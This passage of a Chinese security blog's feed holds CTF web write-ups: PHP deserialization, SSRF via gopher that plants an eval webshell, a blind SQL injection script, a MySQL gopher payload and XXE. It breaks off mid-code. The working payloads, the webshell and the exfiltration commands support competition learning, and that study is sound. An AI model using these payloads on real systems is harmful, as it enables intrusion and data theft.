$result</code>的内容被输入到缓冲区，接着将ssrf.php的内容通过<code>$GLOBALS[&#39;flag&#39;]</code>写入<code>$result</code>，<code>ob_end_clean()</code>清空并关闭缓冲区</p><p>可以看到整个过程是不会有任何输出的，所以这里如果想输出ssrf.php文件的内容，需要突破两个限制：</p><p>1、如何再次调用一次<code>$student-&gt;$boy()</code></p><p>2、如何在再次调用<code>$student-&gt;$boy()</code>时绕过后面的<code>ob_end_clean()</code></p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($num=<span class="string">"result"</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;age=<span class="keyword">new</span> Pass();</div><div class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="string">"read"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;num=$num;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a=arrar(<span class="keyword">new</span> User(),<span class="keyword">new</span> User(<span class="string">"this"</span>));</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>1、通过两次反序列化可以再次调用<code>$student-&gt;$boy()</code><br>2、第二次反序列化时，将<code>$num</code>属性设置为this，使其在<code>global $$a</code>的位置报错，导致程序终止，这样<code>ob_end_clean()</code>就不会执行了，于是就可以输出第一次反序列化经过<code>$GLOBALS[&#39;flag&#39;]</code>设置后的<code>$result</code></p><p>传入</p><pre><code>x=a:2:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:1;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/aOYsDFELeBcd.png?imageslim" alt="mark"></p><p>获取ssrf.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></div><div class="line">    $url = $_GET[<span class="string">'we_have_done_ssrf_here_could_you_help_to_continue_it'</span>] ?? <span class="keyword">false</span>; </div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag|var|apache|conf|proc|log/i"</span> ,$url))&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">""</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($url)</div><div class="line">    &#123; </div><div class="line"></div><div class="line">            $ch = curl_init(); </div><div class="line">            curl_setopt($ch, CURLOPT_URL, $url); </div><div class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</div><div class="line">            curl_exec($ch);</div><div class="line">            curl_close($ch); </div><div class="line"></div><div class="line">     &#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据源码提示对本机35000-50000的端口进行探测，发现40000端口存在应用</p><p><img src="http://pic.c1imber.top/blog/20200824/K80ryB3jVD0N.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200824/f60jzbD31hHy.png?imageslim" alt="mark"></p><p>根据题目的提示和页面源码</p><p><img src="http://pic.c1imber.top/blog/20200824/kq6HHR8tCuAq.png?imageslim" alt="mark"></p><p>这里需要使用gopher协议通过POST传递一些参数过去</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%252022%250d%250a%250d%250afile%3d11.txt%26content%3d11</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/yAEe0xoHsuLz.png?imageslim" alt="mark"></p><p>经过测试是写到了<code>uploads/sessionid/$_POST[&#39;file&#39;]</code>这个文件里面</p><p><img src="http://pic.c1imber.top/blog/20200824/XsqHaaoncvUH.png?imageslim" alt="mark"></p><p>写shell的时候有点坑</p><p>经过多次尝试，最终通过<code>php://filter</code>协议base64二次编码可以写入成功</p><p>写入shell内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>]);<span class="comment">//1</span></div></pre></td></tr></table></figure><p>payload</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520136%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode%257cconvert.base64-decode/resource%253dread.php%2526content%253dUEQ5d2FIQWdRR1YyWVd3b0pGOUhSVlJiTVYwcE95OHZNUT09</code></pre><p>读取flag</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520/fla*&apos;);</code></pre><p>因为we_have_done_ssrf_here_could_you_help_to_continue_it当中不能有flag字符，用linux通配符绕过</p><p><img src="http://pic.c1imber.top/blog/20200825/yirAe72NYofF.png?imageslim" alt="mark"></p><p>读取内网系统的index.php看看过滤了什么</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520../../index.php&apos;);</code></pre><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">#ini_set('display_errors', 'on');</span></div><div class="line"></div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</div><div class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</div><div class="line">$id=session_id();</div><div class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</div><div class="line"></div><div class="line">chdir($upload_dir);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</div><div class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</div><div class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</div><div class="line">                unlink($file);</div><div class="line">        &#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</div><div class="line">            Delete($file);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$data = <span class="string">""</span>;</div><div class="line">$filename = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</div><div class="line">$filename = $_POST[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</div><div class="line">            $data = $_POST[<span class="string">'content'</span>];</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</div><div class="line">                file_put_contents($filename, $data);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; </div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>可以看到过滤了很多字符，其中包括PD9wa，这也是为什么要进行二次base64编码的原因，因为如果对&lt;?php xxx?&gt;进行一次base64编码，结果一定是PD9wa开头的，导致写不进去，另外还过滤了很多字符，需要多次尝试才能写入</p><p>其实这道题通过一次base64编码也是可以写进去的</p><p><img src="http://pic.c1imber.top/blog/20200825/YIqCW06UXkSN.png?imageslim" alt="mark"></p><p><code>1&lt;?php @eval($_GET[1]);//aa</code>这段php代码经过一次base64后也不会出现不允许的字符</p><p>一次base64写入</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520102%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode/resource%253dread.php%2526content%253dMTw%252fcGhwIEBldmFsKCRfR0VUWzFdKTsvL2Fh</code></pre><p><img src="http://pic.c1imber.top/blog/20200825/UXAdoetg1Ak6.png?imageslim" alt="mark"></p><p>也可以成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20200825/r3tj8yI4iXiE.png?imageslim" alt="mark"></p><p>但是做题的时候并不知道这个黑名单，也很难想到</p><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;没做出几道题，记录一下吧，周末两天的做题还是有收获的&lt;/p&gt;
&lt;h1 id=&quot;强网先锋&quot;&gt;&lt;a href=&quot;#强网先锋&quot; class=&quot;headerlink&quot; title=&quot;强网先锋&quot;&gt;&lt;/a&gt;强网先锋&lt;/h1&gt;&lt;h3 id=&quot;web辅助&quot;&gt;&lt;a href=&quot;#web辅助&quot;
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR RCE分析</title>
    <link href="https://c1aysec.github.io/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20RCE%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2020/08/18/深信服EDR RCE分析/</id>
    <published>2020-08-18T09:10:49.337Z</published>
    <updated>2020-08-18T09:33:31.954Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e132e726f79486f47d91b6a64045b5636dda1d0234d11891e66ff6ff62e3c46e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Apache SkyWalking SQL注入漏洞-CVE-2020-13921</title>
    <link href="https://c1aysec.github.io/2020/08/08/Apache%20SkyWalking%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-13921/"/>
    <id>https://c1aysec.github.io/2020/08/08/Apache SkyWalking SQL注入漏洞-CVE-2020-13921/</id>
    <published>2020-08-07T18:32:19.800Z</published>
    <updated>2020-08-07T18:49:53.368Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="577fe5eb6d7716d733900bd2ec7987cafcd17dbe489640d8741cb3d5eb8822fc"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2020宁波市第三届网络安全大赛-web题writeup</title>
    <link href="https://c1aysec.github.io/2020/05/25/2020%E5%AE%81%E6%B3%A2%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-web%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/</id>
    <published>2020-05-25T07:34:45.989Z</published>
    <updated>2020-07-09T07:11:53.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧</p><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>提示：这是只有本地管理员权限才能访问的页面，你想要越权访问？</p><p>直接<code>X-Forwarded-For: 127.0.0.1</code>结合<code>Cookie: user=admin</code></p><p><img src="http://pic.c1imber.top/blog/20200705/rDiunidzUJgz.png?imageslim" alt="mark"></p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>在这道题上花了一些时间，注入类型为数字型，注入点的位置应该是在where xxx=xxx的位置，经过一番测试发现最基本的注入语句都被过滤了，很大可能是是基于正则的过滤，经过fuzz后猜测一些过滤规则如下：</p><p>首先尝试union select进行回显，发现过滤规则如下：</p><p><code>出现数字+任意字符+SQL关键字（这里的正则没有绕过）</code></p><p>1select   被过滤<br>1union    被过滤<br>等</p><p>导致不能union select联合查询</p><p>尝试盲注，发现过滤规则如下：</p><p><code>任意字符(出现数字)like|=|&gt;|&lt;|&lt;&gt;|\|\||\||^|&amp;等运算字符</code>，如下图</p><p><img src="http://pic.c1imber.top/blog/20200705/BT1dbUR7ppAP.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/h2OJJlyQj2Eq.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/97NIGGEkDfih.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/6Bju1BmlVN1x.png?imageslim" alt="mark"></p><p>导致不能使用substr、substring、mid、right、left等字符串截取字符去进行盲注判断</p><p>经过一番分析可以看到上面过滤的关键点就是尽量避免出现数字，可以使用<code>like</code>模糊匹配进行绕过，具体如下：</p><p>当id=0时，结果为：学号：0，成绩为： 94<br><img src="http://pic.c1imber.top/blog/20200705/NxsMPF90axhj.png?imageslim" alt="mark"></p><p>当id=1时，结果为：学号：1，成绩为： 52<br><img src="http://pic.c1imber.top/blog/20200705/cQrYTXJ5rECj.png?imageslim" alt="mark"></p><p>尝试将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;%&apos;</div></pre></td></tr></table></figure></p><p>此时结果为真，返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;%&apos;，成绩为： 52</div></pre></td></tr></table></figure><p>这里返回了学号为1的学生成绩，说明可以通过这种方式获取到flag，但是在写脚本后发现只能获取到flag的前两个字符<code>d7</code>，之后就卡住了，继续进行分析</p><p>当<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;d7%&apos;</div></pre></td></tr></table></figure></p><p>这个时候还返回正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;d7%&apos;，成绩为： 52</div></pre></td></tr></table></figure></p><p>但是继续尝试获取字符时发现被拦截</p><p><img src="http://pic.c1imber.top/blog/20200705/wYHHCamngbP0.png?imageslim" alt="mark"></p><p>由此判断存在新的过滤规则如下：</p><p><code>&#39;出现两个数字以上%&#39;|&quot;出现两个数字以上%&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200705/qFkp4QADeyKi.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/5XmX8eLAMMco.png?imageslim" alt="mark"></p><p>所以导致在获取<code>d7</code>两个字符后不能继续获取数据</p><p>解决办法：在mysql模糊匹配当中，<code>_</code>可以匹配一个位置的字符，所以可以通过这个特性把payload当中已经获得到的数字替换为<code>_</code>，这样就可以保证payload当中不会出现两个数字以上，如图，可以继续获取到第三个字符为e：<br><img src="http://pic.c1imber.top/blog/20200705/OFG8HJOaSv8w.png?imageslim" alt="mark"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">session = requests.Session()</div><div class="line">l=<span class="string">"01234567890abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line">flag1=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">    paramsPost = &#123;<span class="string">"id"</span>:<span class="string">"(select flag from flag) like "</span>+<span class="string">"'flag&#123;"</span>+<span class="string">"%s"</span>%(flag1+i)+<span class="string">"%'"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://119.61.19.212:58888"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://119.61.19.212:58888/"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        response = session.post(<span class="string">"http://119.61.19.212:58888/index.php"</span>, data=paramsPost, headers=headers).text</div><div class="line">        <span class="keyword">if</span> <span class="string">"52"</span> <span class="keyword">in</span> response:</div><div class="line">            <span class="keyword">print</span> paramsPost</div><div class="line">            flag+=i</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag1+=i</div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">                flag1=flag1.replace(i,<span class="string">"_"</span>)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200705/vNbmlDsrSLgL.png?imageslim" alt="mark"></p><p><code>flag{d7ee68cb5251585d83e0b8cdb2aa06ef}</code></p><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>考察ssrf+mysql的利用，通过dict协议探测到3306端口，mysql用户名root、密码是空密码，直接gopher协议打就行，可以使用<code>gopherus.py</code>直接生成payload</p><p><img src="http://pic.c1imber.top/blog/20200705/XLn0M5hiqMA3.png?imageslim" alt="mark"></p><p>需要对payload进行二次url编码，最终payload如下</p><p><code>gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2518%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2573%2573%2572%2566%252e%2566%256c%2561%2567%2501%2500%2500%2500%2501</code></p><p><img src="http://pic.c1imber.top/blog/20200705/IY43I2QbguNd.png?imageslim" alt="mark"></p><h3 id="easy-xxe"><a href="#easy-xxe" class="headerlink" title="easy_xxe"></a>easy_xxe</h3><p>可以读取到<code>/etc/passwd</code>文件，但是找不到flag位置，比赛结束也没做出来，等writeup学习吧，哭</p><h3 id="2020-7-9补充"><a href="#2020-7-9补充" class="headerlink" title="2020.7.9补充"></a>2020.7.9补充</h3><p>看了其他师傅们easy_sql这道题的writeup，发现可以直接从index.php.bak当中获取源码从而得到过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(preg_match(&quot;/\d.+?\D.+/is&quot;,$id)</div></pre></td></tr></table></figure><p>所以非常好绕，给出两个从其他师傅博客看到的writeup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ord(&apos;a&apos;)-ord(&apos;b&apos;) union select group_ concat(flag) from bankdb.flag</div><div class="line"></div><div class="line">now() union select group_ concat(flag) from bankdb.flag</div></pre></td></tr></table></figure><p>当时写这道题时自己绝对是脑抽了，，，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧&lt;/p&gt;
&lt;h3 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; cl
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯朱雀组-部分web</title>
    <link href="https://c1aysec.github.io/2020/05/17/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%83%A8%E5%88%86web/"/>
    <id>https://c1aysec.github.io/2020/05/17/2020网鼎杯朱雀组-部分web/</id>
    <published>2020-05-17T05:42:35.134Z</published>
    <updated>2020-08-23T15:53:02.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下</p><p><img src="http://pic.c1imber.top/blog/20200517/bsyihTlgKeKg.png?imageslim" alt="mark"></p><p>通过提交的内容很容易想到了php代码执行，但是经过简单测试发现好像过滤了很多函数，那么首先尝试读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=file_get_contents&amp;p=index.php</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/nQVCr7AUvwMu.png?imageslim" alt="mark"></p><p>获取到源码如下，很容易看到代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span 